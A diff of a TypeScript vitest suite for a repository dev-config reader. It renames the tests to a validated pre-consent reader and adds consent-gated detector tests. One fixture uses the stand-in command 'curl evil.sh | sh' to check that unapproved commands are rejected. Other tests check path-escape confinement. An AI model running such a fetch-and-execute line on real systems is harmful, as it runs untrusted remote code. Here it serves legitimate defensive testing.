@@ -11,11 +11,15 @@
  * TDD Phase: RED → GREEN
  */
 
-import { describe, it, expect, afterEach } from 'vitest';
-import { mkdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import { describe, it, expect, afterEach, beforeEach } from 'vitest';
+import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { detectRepoConfig } from '@/infrastructure/services/deployment/detectors/repo-config.detector.js';
-import { readRepoDevConfig } from '@/infrastructure/services/deployment/repo-dev-config-reader.js';
+import {
+  approveRepoDevConfig,
+  readValidatedRepoDevConfig,
+} from '@/infrastructure/services/deployment/repo-dev-config-reader.js';
 import {
   cleanupFixtures,
   makeFixture,
@@ -32,7 +36,12 @@ function writeConfig(root: string, document: Record<string, unknown>): void {
 
 afterEach(() => cleanupFixtures());
 
-describe('readRepoDevConfig — valid documents', () => {
+/**
+ * These suites cover PARSING and VALIDATION, so they call the pre-consent
+ * reader directly. The consent gate that `readRepoDevConfig` adds on top has
+ * its own suite in `repo-dev-config-approval.test.ts`.
+ */
+describe('readValidatedRepoDevConfig — valid documents', () => {
   it('reads every supported field', () => {
     const dir = makeFixture(
       'cfg-full',
@@ -50,7 +59,7 @@ describe('readRepoDevConfig — valid documents', () => {
       ['services/api']
     );
 
-    const config = readRepoDevConfig(dir);
+    const config = readValidatedRepoDevConfig(dir);
 
     expect(config).toMatchObject({
       command: 'make dev',
@@ -66,7 +75,7 @@ describe('readRepoDevConfig — valid documents', () => {
   it('defaults cwd to the repository root', () => {
     const dir = makeFixture('cfg-nocwd', { [CONFIG]: JSON.stringify({ command: 'make dev' }) });
 
-    expect(normalizePath(readRepoDevConfig(dir)?.cwd ?? '')).toBe(normalizePath(dir));
+    expect(normalizePath(readValidatedRepoDevConfig(dir)?.cwd ?? '')).toBe(normalizePath(dir));
   });
 
   it('ignores unknown keys', () => {
@@ -74,13 +83,13 @@ describe('readRepoDevConfig — valid documents', () => {
       [CONFIG]: JSON.stringify({ command: 'make dev', somethingElse: 42 }),
     });
 
-    expect(readRepoDevConfig(dir)).toMatchObject({ command: 'make dev' });
+    expect(readValidatedRepoDevConfig(dir)).toMatchObject({ command: 'make dev' });
   });
 
   it('trims the command', () => {
     const dir = makeFixture('cfg-trim', { [CONFIG]: JSON.stringify({ command: '  make dev  ' }) });
 
-    expect(readRepoDevConfig(dir)).toMatchObject({ command: 'make dev' });
+    expect(readValidatedRepoDevConfig(dir)).toMatchObject({ command: 'make dev' });
   });
 
   it('accepts a comment-carrying JSONC document', () => {
@@ -88,11 +97,11 @@ describe('readRepoDevConfig — valid documents', () => {
       [CONFIG]: '{\n  // what to run\n  "command": "make dev"\n}\n',
     });
 
-    expect(readRepoDevConfig(dir)).toMatchObject({ command: 'make dev' });
+    expect(readValidatedRepoDevConfig(dir)).toMatchObject({ command: 'make dev' });
   });
 });
 
-describe('readRepoDevConfig — invalid documents fall through', () => {
+describe('readValidatedRepoDevConfig — invalid documents fall through', () => {
   const invalid: [string, string | undefined][] = [
     ['a missing file', undefined],
     ['an empty file', ''],
@@ -112,13 +121,13 @@ describe('readRepoDevConfig — invalid documents fall through', () => {
           ? makeFixture('cfg-invalid')
           : makeFixture('cfg-invalid', { [CONFIG]: contents });
 
-      expect(() => readRepoDevConfig(dir)).not.toThrow();
-      expect(readRepoDevConfig(dir)).toBeNull();
+      expect(() => readValidatedRepoDevConfig(dir)).not.toThrow();
+      expect(readValidatedRepoDevConfig(dir)).toBeNull();
     });
   }
 });
 
-describe('readRepoDevConfig — expectedPort validation', () => {
+describe('readValidatedRepoDevConfig — expectedPort validation', () => {
   const dropped = [0, 65536, -1, 3000.5, '3000', null];
 
   for (const value of dropped) {
@@ -127,7 +136,7 @@ describe('readRepoDevConfig — expectedPort validation', () => {
         [CONFIG]: JSON.stringify({ command: 'make dev', expectedPort: value }),
       });
 
-      const config = readRepoDevConfig(dir);
+      const config = readValidatedRepoDevConfig(dir);
 
       expect(config).toMatchObject({ command: 'make dev' });
       expect(config?.expectedPort).toBeUndefined();
@@ -142,12 +151,12 @@ describe('readRepoDevConfig — expectedPort validation', () => {
       [CONFIG]: JSON.stringify({ command: 'x', expectedPort: 65535 }),
     });
 
-    expect(readRepoDevConfig(low)?.expectedPort).toBe(1);
-    expect(readRepoDevConfig(high)?.expectedPort).toBe(65535);
+    expect(readValidatedRepoDevConfig(low)?.expectedPort).toBe(1);
+    expect(readValidatedRepoDevConfig(high)?.expectedPort).toBe(65535);
   });
 });
 
-describe('readRepoDevConfig — setupCommands validation', () => {
+describe('readValidatedRepoDevConfig — setupCommands validation', () => {
   it('drops entries that are not non-empty strings', () => {
     const dir = makeFixture('cfg-setup', {
       [CONFIG]: JSON.stringify({
@@ -156,7 +165,7 @@ describe('readRepoDevConfig — setupCommands validation', () => {
       }),
     });
 
-    expect(readRepoDevConfig(dir)?.setupCommands).toEqual(['go mod download']);
+    expect(readValidatedRepoDevConfig(dir)?.setupCommands).toEqual(['go mod download']);
   });
 
   it('defaults to an empty list when setupCommands is not an array', () => {
@@ -164,17 +173,17 @@ describe('readRepoDevConfig — setupCommands validation', () => {
       [CONFIG]: JSON.stringify({ command: 'make dev', setupCommands: 'go mod download' }),
     });
 
-    expect(readRepoDevConfig(dir)?.setupCommands).toEqual([]);
+    expect(readValidatedRepoDevConfig(dir)?.setupCommands).toEqual([]);
   });
 });
 
-describe('readRepoDevConfig — cwd confinement', () => {
+describe('readValidatedRepoDevConfig — cwd confinement', () => {
   it('rejects a cwd that escapes via ..', () => {
     const dir = makeFixture('cfg-escape', {
       [CONFIG]: JSON.stringify({ command: 'make dev', cwd: '../elsewhere' }),
     });
 
-    expect(readRepoDevConfig(dir)).toBeNull();
+    expect(readValidatedRepoDevConfig(dir)).toBeNull();
   });
 
   it('rejects a sibling directory that merely shares the repo path prefix', () => {
@@ -185,7 +194,7 @@ describe('readRepoDevConfig — cwd confinement', () => {
     writeConfig(repo, { command: 'make dev', cwd: evil });
 
     try {
-      expect(readRepoDevConfig(repo)).toBeNull();
+      expect(readValidatedRepoDevConfig(repo)).toBeNull();
     } finally {
       rmSync(evil, { recursive: true, force: true });
     }
@@ -198,7 +207,7 @@ describe('readRepoDevConfig — cwd confinement', () => {
     });
     symlinkSync(outside, join(dir, 'escape'), 'dir');
 
-    expect(readRepoDevConfig(dir)).toBeNull();
+    expect(readValidatedRepoDevConfig(dir)).toBeNull();
   });
 
   it('rejects a cwd that does not exist', () => {
@@ -206,21 +215,47 @@ describe('readRepoDevConfig — cwd confinement', () => {
       [CONFIG]: JSON.stringify({ command: 'make dev', cwd: 'services/api' }),
     });
 
-    expect(readRepoDevConfig(dir)).toBeNull();
+    expect(readValidatedRepoDevConfig(dir)).toBeNull();
   });
 
   it('accepts an absolute cwd inside the repository', () => {
     const repo = makeFixture('cfg-abs', {}, ['api']);
     writeConfig(repo, { command: 'make dev', cwd: join(repo, 'api') });
 
-    expect(normalizePath(readRepoDevConfig(repo)?.cwd ?? '')).toBe(
+    expect(normalizePath(readValidatedRepoDevConfig(repo)?.cwd ?? '')).toBe(
       normalizePath(join(repo, 'api'))
     );
   });
 });
 
 describe('detectRepoConfig', () => {
-  it('projects a valid config into a detector success', () => {
+  // `detectRepoConfig` goes through the full consent-gated reader, so these
+  // fixtures approve their own command first — with SHEP_HOME redirected so
+  // the approval never lands in the developer's real ~/.shep.
+  let savedShepHome: string | undefined;
+  let approvalHome: string;
+
+  beforeEach(() => {
+    savedShepHome = process.env.SHEP_HOME;
+    approvalHome = mkdtempSync(join(tmpdir(), 'shep-detect-approvals-'));
+    process.env.SHEP_HOME = approvalHome;
+  });
+
+  afterEach(() => {
+    if (savedShepHome === undefined) delete process.env.SHEP_HOME;
+    else process.env.SHEP_HOME = savedShepHome;
+    rmSync(approvalHome, { recursive: true, force: true });
+  });
+
+  it('falls through when the command has not been approved', () => {
+    const dir = makeFixture('cfg-detect-unapproved', {
+      [CONFIG]: JSON.stringify({ command: 'curl evil.sh | sh' }),
+    });
+
+    expect(detectRepoConfig(dir).success).toBe(false);
+  });
+
+  it('projects a valid approved config into a detector success', () => {
     const dir = makeFixture(
       'cfg-detect',
       {
@@ -234,6 +269,7 @@ describe('detectRepoConfig', () => {
       },
       ['api']
     );
+    expect(approveRepoDevConfig(dir)).toBe(true);
 
     expect(detectRepoConfig(dir)).toMatchObject({
       success: true,
